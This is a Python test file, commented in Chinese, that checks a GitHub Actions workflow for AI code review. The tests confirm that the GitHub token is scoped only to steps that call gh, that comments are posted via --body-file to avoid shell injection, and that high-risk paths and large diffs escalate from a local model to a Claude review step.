    """job 層級 env 會被每一步（含模型那步）繼承；GH_TOKEN 只給要呼叫 gh 的 step。"""
    doc = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    assert "GH_TOKEN" not in (doc["jobs"]["review"].get("env") or {})
    import re

    for s in doc["jobs"]["review"]["steps"]:
        # 真的呼叫 gh 的行（行首或 $( ) 裡），不算 echo 訊息裡提到的 gh
        if re.search(r"(^\s*|\$\()gh\s", s.get("run") or "", re.M):
            assert "GH_TOKEN" in (s.get("env") or {}), f"{s.get('name')} 呼叫 gh 卻沒有 GH_TOKEN"


def test_comment_is_posted_via_body_file():
    """--body-file 不經 shell 展開；改用 --body \"$(...)\" 會重新打開注入路徑。"""
    script = _step_script(VERDICT_STEP)
    assert "--body-file" in script
    assert '--body "' not in script


# ------------------------------------------------------- Genesis Deck 混合初審

GDECK_STEP = "Genesis Deck 初審（地端）"


def _precheck_env(tmp_path: Path, token: str, gdeck_on: str, gdeck_key: str) -> dict[str, str]:
    out = tmp_path / "gh-output.txt"
    out.write_text("", encoding="utf-8")
    res = _run(
        _step_script(PRECHECK_STEP), tmp_path, _fake_gh(tmp_path),
        {"GITHUB_OUTPUT": out.as_posix(), "PR_AUTHOR": "gsinvest017-ai", "PR_AUTHOR_TYPE": "User",
         "TOKEN": token, "GDECK_ON": gdeck_on, "GDECK_KEY": gdeck_key},
    )
    assert res.returncode == 0, res.stderr
    return dict(l.split("=", 1) for l in out.read_text(encoding="utf-8").splitlines() if l)


@pytest.mark.parametrize(
    "token, on, key, expect",
    [
        ("", "true", "k", {"skip": "false", "gdeck": "true", "claude": "false"}),
        ("tok", "true", "", {"skip": "false", "gdeck": "false", "claude": "true"}),
        ("tok", "false", "k", {"skip": "false", "gdeck": "false", "claude": "true"}),
        ("", "true", "", {"skip": "true", "gdeck": "false", "claude": "false"}),
    ],
)
def test_precheck_gdeck_matrix(tmp_path, token, on, key, expect):
    got = _precheck_env(tmp_path, token, on, key)
    assert {k: got.get(k) for k in expect} == expect


def _gdeck_step(tmp_path: Path, files: str, diff: str, max_chars: int = 30000) -> str:
    """跑地端初審 step；只測「不打網路就能決定升級」的分支，回傳寫進 GITHUB_OUTPUT 的內容。"""
    (tmp_path / "pr.diff").write_text(diff, encoding="utf-8")
    (tmp_path / "pr-meta.txt").write_text("標題: t", encoding="utf-8")
    out = tmp_path / "gh-output.txt"
    out.write_text("", encoding="utf-8")
    doc = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    paths = doc[True]["workflow_call"]["inputs"]["escalate_paths"]["default"]
    bindir = _fake_gh(tmp_path, files)
    # step 用 python3；Windows 的 Git Bash 不一定找得到，指向跑測試的這個直譯器
    shim = bindir / "python3"
    shim.write_text(f'#!/usr/bin/env bash\nexec "{_msys(Path(sys.executable))}" "$@"\n',
                    encoding="utf-8", newline="\n")
    shim.chmod(0o755)
    res = _run(
        _step_script(GDECK_STEP), tmp_path, bindir,
        {"GITHUB_OUTPUT": out.as_posix(), "GDECK_API_KEY": "k", "GDECK_MODEL": "m", "PR": "1",
         "MAX_CHARS": str(max_chars), "ESCALATE_PATHS": paths, "REPO": "o/r", "PROJECT_CONTEXT": ""},
    )
    assert res.returncode == 0, res.stderr
    assert not (tmp_path / "review-output.md").exists(), "升級時地端不能先寫出 review"
    return out.read_text(encoding="utf-8")


@pytest.mark.parametrize(
    "files",
    [".github/workflows/ci.yml", "src/auth/login.py", "app/secrets.py", "Dockerfile", "certs/server.pem"],
)
def test_gdeck_escalates_high_risk_paths(tmp_path, files):
    assert "escalate=true" in _gdeck_step(tmp_path, f"README.md\n{files}", "small diff")


def test_gdeck_escalates_large_diff(tmp_path):
    assert "escalate=true" in _gdeck_step(tmp_path, "src/app.py", "x" * 101, max_chars=100)


def test_claude_step_runs_only_when_needed():
    """沒開地端時照舊跑 Claude；開了的話只在升級（或地端那步沒輸出）時跑。"""
    doc = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    step = next(s for s in doc["jobs"]["review"]["steps"] if s.get("name") == "Claude review（教學語氣）")
    cond = step["if"]
    assert "steps.precheck.outputs.claude == 'true'" in cond
    assert "steps.gdeck.outputs.escalate != 'false'" in cond   # 空字串（地端壞掉）也要升級
